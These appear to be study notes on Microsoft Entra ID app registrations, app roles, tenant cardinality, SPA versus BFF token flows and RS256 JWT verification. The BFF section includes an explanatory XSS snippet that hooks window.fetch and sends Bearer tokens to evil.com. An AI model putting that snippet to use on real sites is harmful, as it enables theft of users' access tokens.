# Entra ID — App Roles, BFF Pattern, JWT Signing Deep Dive

Source: Live Socratic session (2026-04-11)
Topics: App Registration properties, tenant/subscription cardinality, App Roles mechanics, BFF vs SPA token patterns, XSS attack vectors, JWT signature verification

---

## App Registration — All Properties

### Section 1: Identity (Overview Tab)
- **Display Name** — human-readable label shown on consent screens. No functional effect on token issuance.
- **Application (client) ID** — GUID issued by Microsoft at registration. Globally unique across all tenants. Immutable. Appears as `azp` claim in JWTs. Frontend MSAL config uses this.
- **Directory (tenant) ID** — GUID of the tenant where the App Registration lives. Used to construct authority URL: `https://login.microsoftonline.com/{tenantId}`.
- **Supported account types** — controls which users can sign in: single tenant, multi-tenant, or multi-tenant + personal MSA. Drives `iss` claim validation logic.

### Section 2: Authentication Tab
- **Platform configuration** — declares app runtime type (SPA, Web, Mobile, Daemon). Controls which OAuth flows are enabled.
  - SPA → Auth Code + PKCE, no secret (public client)
  - Web → Auth Code + client_secret (confidential client)
- **Redirect URIs** — security whitelist. Entra ID performs exact string match. Auth code only sent to pre-registered URIs. Primary defense against auth code interception.
- **Front-channel logout URL** — called by Entra ID on sign-out from another SSO app.
- **Implicit grant** — legacy checkboxes for id_token/access_token in URL fragment. Leave OFF for SPAs. Auth Code + PKCE is more secure.
- **Allow public client flows** — enables device code, ROPC flows. Only for CLI/deviceless apps.

### Section 3: Certificates & Secrets Tab
- **Client Secrets** — string password, shown once. Used by confidential clients in server-to-server token exchange. Max 24 months. Expiry silently breaks login (returns 401).
- **Certificates** — X.509 cert (public key uploaded, private key stays on server). More secure than secrets. Private key never transmitted.
- **Federated Identity Credentials** — allows external IdPs (GitHub Actions, Kubernetes, AWS) to authenticate without any secret via OIDC token.

### Section 4: API Permissions Tab (Wishlist — NOT granted)
- **Delegated permissions** — apply when user is signed in. Effective permission = intersection of user's permissions and app's requested permissions. Appear as `scp` claim.
- **Application permissions** — apply when app runs without a user (daemon). Always require admin consent.
- **Requested ≠ Granted** — requesting a permission here has no runtime effect until a user or admin consents. Consent writes to the Service Principal.

### Section 5: Expose an API Tab (Backend registrations only)
- **Application ID URI** — globally unique identifier for the API. Becomes `aud` claim in tokens. Convention: `api://{client_id}` or custom domain.
- **Scopes** — named permission units the API defines.
  - Fields: Scope Name, Display name, Description, Who can consent, State (enabled/disabled)
  - Scope string encodes both resource and permission: `api://backend/Scores.Read` → `aud` = `api://backend`, `scp` = `Scores.Read`
- **Authorized client applications (Pre-authorization)** — list of client_ids that can request tokens for this API without showing a consent screen.

### Section 6: App Roles Tab
App Roles are a mechanism for RBAC inside your own application. Distinct from OAuth scopes.

**App Role definition fields (confirmed via Microsoft docs — no group_assignment property exists):**
| Field | Description | Example |
|---|---|---|
| Display name | Human-readable label | "Report Viewer" |
| Allowed member types | Type constraint: Users/Groups, Applications, or Both | Users/Groups |
| Value | String that appears in JWT `roles` claim | "Reports.Viewer" |
| Description | Shown during admin assignment | "Can view reports" |
| State (Enabled) | On/Off toggle | Enabled |

**Scopes vs App Roles:**
- Scopes (`scp` claim) — what the app can DO on behalf of the user (delegated)
- App Roles (`roles` claim) — what role the user IS within the application (RBAC)

**Where group-to-role mapping lives:**
The App Role definition itself contains NO reference to any specific Entra ID group. The mapping is separate:
```
Azure Portal
  → Entra ID
    → Enterprise Applications
      → [Your App]
        → Users and Groups
          → Add assignment
            → Select: Security Group X
            → Select role: Reports.Viewer
            → Assign
```
This is on the **Enterprise Application (Service Principal)**, not the App Registration.

**App Role lifecycle in JWT:**
1. User logs in
2. Entra ID checks assignments on the Enterprise Application
3. User is in Security Group X → Security Group X is assigned to Reports.Viewer
4. JWT issued with `roles: ["Reports.Viewer"]`
5. If user has no role assignment → `roles` claim is ABSENT (not an empty array)
6. Backend checks `roles` claim → missing or wrong → 403
7. 403 is thrown by the BACKEND, not Entra ID. Entra ID always issues the JWT.

### Section 7: Token Configuration Tab
- **Optional claims** — fields not included by default: email, family_name, upn, auth_time, etc.
- **Group claims** — controls how group membership appears in token. Warning: >150 groups causes overflow — `groups` claim is omitted, backend must call Graph API.

### Section 8: Manifest
Raw JSON of the entire App Registration. Key advanced properties:
- `accessTokenAcceptedVersion` — null = v1 tokens, 2 = v2 tokens. Changing this silently changes `iss` claim format.
- `signInAudience` — equivalent of Supported account types.
- `preAuthorizedApplications` — pre-authorization list in JSON.

---

## Cardinality: App Registration, Service Principal, Tenant, Subscription

| Relationship | Cardinality |
|---|---|
| Tenant → App Registrations | 1 → MANY (one tenant owns many registrations) |
| App Registration → Tenant | MANY → 1 (each registration belongs to exactly one home tenant) |
| App Registration → SPN | 1 → MANY (one SPN per tenant where the app is used) |
| SPN → App Registration | MANY → 1 (all SPNs share one appId) |
| SPN → Tenant | MANY → 1 (a SPN lives in one tenant) |
| Tenant → Subscriptions | 1 → MANY |
| Subscription → Tenant | MANY → 1 (a subscription trusts exactly one tenant) |
| SPN → Subscription | 1 → MANY (via RBAC role assignments) |

**Home Tenant** — the tenant where you created the App Registration.
- App Registration lives here exclusively
- Home tenant's SPN is created automatically at registration time
- Credentials (client_secret, certificates) are tied here
- Other tenants where the app runs get a **guest SPN** — different Object ID, same appId, independent granted permissions

**Tenant vs Subscription:**
- Tenant = identity directory (who you are). Holds users, groups, app registrations, SPNs, policies.
- Subscription = billing and resource container (what you pay for and deploy into).
- A subscription is linked to exactly one trusted tenant. A SPN gets access to a subscription via Azure RBAC role assignment — separate from the Entra ID permissions model.

---

## OAuth Token Flow: Two Patterns

### Pattern 1 — Pure SPA (MSAL exchanges token in browser)
```
Browser/MSAL → Entra ID    (get auth code)
Browser/MSAL → Entra ID    (exchange auth code with ONLY code_verifier — no client_secret)
Browser/MSAL ← Entra ID    (receives access token directly in browser)
Browser      → Backend     (calls API with access token in Authorization: Bearer header)
Backend validates token locally using JWKS — never calls Entra ID
```
- Token lives in MSAL's browser memory
- No client_secret involved in token exchange
- Simpler architecture

### Pattern 2 — BFF / Confidential Client (backend exchanges token)
```
Browser/MSAL → Entra ID    (get auth code)
Browser      → Backend     (sends auth code + code_verifier)
Backend      → Entra ID    (exchanges using client_id + client_secret + code_verifier)
Backend      ← Entra ID    (receives access_token, id_token, refresh_token)
Backend      → Session Store (stores tokens server-side)
Backend      → Browser     (Set-Cookie: session_id=<opaque> HttpOnly Secure SameSite=Strict)
```

**Every subsequent API call:**
```
Browser → Backend    (cookie sent automatically by browser)
Backend → Session Store  (look up access token by session_id)
Backend → Downstream API  (attach access token in Authorization header)
```

**Why Pattern 2 over Pattern 1 — XSS attack surface:**
In Pattern 1, tokens are in browser memory. An XSS-injected script can monkey-patch `window.fetch`:
```javascript
const orig = window.fetch;
window.fetch = function(url, options) {
  if (options?.headers?.Authorization) {
    fetch('https://evil.com/steal?t=' + options.headers.Authorization);
  }
  return orig.apply(this, arguments);
};
```
This intercepts every outgoing API call and exfiltrates the Bearer token.

In Pattern 2, the access token never reaches the browser. Browser only has an HttpOnly cookie. `HttpOnly` flag makes the cookie invisible to JavaScript — `document.cookie` does not show it. XSS script cannot read it.

**Note from Microsoft docs:** "Public clients, which include native applications and single page apps, must not use secrets or certificates when redeeming an authorization code." Pattern 1 is the official SPA flow. Pattern 2 is the BFF/confidential client pattern — more secure for sensitive applications.

### Full BFF Cookie Traffic Path
1. User clicks "Login with Microsoft"
2. JS generates code_verifier + code_challenge (PKCE). Stores code_verifier in sessionStorage.
3. Browser redirects to Entra ID /authorize (with client_id, redirect_uri, scope, state, code_challenge)
4. Entra ID renders login page
5. User enters credentials
6. Entra ID redirects back to redirect_uri with auth code + state
7. JS reads auth code from URL, code_verifier from sessionStorage, validates state (CSRF check)
8. Frontend POSTs to backend: { code, code_verifier, state }
9. Backend validates state, calls Entra ID /token with client_id + client_secret + code + code_verifier
10. Entra ID returns access_token + id_token + refresh_token
11. Backend stores tokens in session store (Redis/DB/memory)
12. Backend responds: Set-Cookie: session_id=<opaque> HttpOnly Secure SameSite=Strict
13. Browser stores cookie (invisible to JS)
14. Every API call: browser sends cookie → backend looks up token → backend calls API

---

## JWT Signature Verification

**Correct model:**
```
Microsoft (signing):
  Step 1: digest = SHA256(header.payload)       ← hash only, no key
  Step 2: signature = encrypt(digest, private_key)  ← key used here only

Backend (verifying):
  Step 1: expected_digest = decrypt(signature, public_key)
  Step 2: computed_digest = SHA256(header.payload)
  Step 3: valid = (expected_digest == computed_digest)
```

**Common misconception corrected:**
- WRONG: `signature = hash(private_key, header.payload)` — key is NOT an input to the hash function
- RIGHT: hash first (no key), then encrypt the hash output with the private key

The private key encrypts the hash. The public key decrypts it for verification. This is RS256 (RSA + SHA-256).
- Hash ensures **integrity** — any change to header/payload produces a different digest
- Asymmetric encryption ensures **authenticity** — only Microsoft (private key holder) could have produced the signature

Backend finds the correct public key using the `kid` (key ID) header in the JWT, which points to the matching key in Entra ID's JWKS endpoint.
